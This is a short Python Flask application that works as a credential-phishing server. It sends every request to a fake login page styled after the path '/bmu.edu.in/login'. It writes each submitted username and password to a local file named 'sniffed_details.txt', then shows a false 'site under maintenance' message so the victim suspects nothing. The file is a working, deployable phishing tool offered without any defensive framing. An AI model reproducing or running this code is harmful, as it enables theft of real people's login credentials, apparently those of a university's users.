from flask import Flask, redirect, render_template, url_for, request
import time

app = Flask(__name__)

@app.route('/',defaults={'path':''})
@app.route('/<path:path>')
def catch_all(path):
    return redirect(url_for('login'))


@app.route('/bmu.edu.in/login',methods=['POST','GET',])
def login():
    if request.method == 'POST':
        time.sleep(1)
        username= request.form['username']
        password= request.form['password']
        with open('sniffed_details.txt', 'a') as fd:
            fd.write(username + '  ' + password + '\n')
        return render_template('login.html', message= '''Site under maintenance! Please try again soon while we work to fix this issue''')

    else:
        return render_template('login.html', message= '')



if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port= 80)

